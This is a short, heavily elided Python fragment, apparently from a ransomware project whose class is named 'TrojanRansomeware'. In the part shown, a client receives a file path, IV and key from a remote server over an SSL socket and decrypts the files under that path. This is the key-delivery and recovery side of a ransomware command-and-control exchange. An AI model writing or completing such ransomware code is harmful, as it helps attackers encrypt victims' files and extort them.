...
try:
    ...
    if isInDatabase == 1:
        ...
        ssl_lock.send(int(2).to_bytes(1, 'big'))

        # Get the path, iv and key
        bytes_size_path = int.from_bytes(ssl_lock.recv(32), byteorder="big")
        path = ssl_lock.recv(bytes_size_path).decode('utf-8')
        iv = ssl_lock.recv(16)
        key = ssl_lock.recv(32)

        # Active decryption on the path and send success status
        software = TrojanRansomeware(key, iv)
        software.encryption_decryption_path(path, software.decrypt_file)
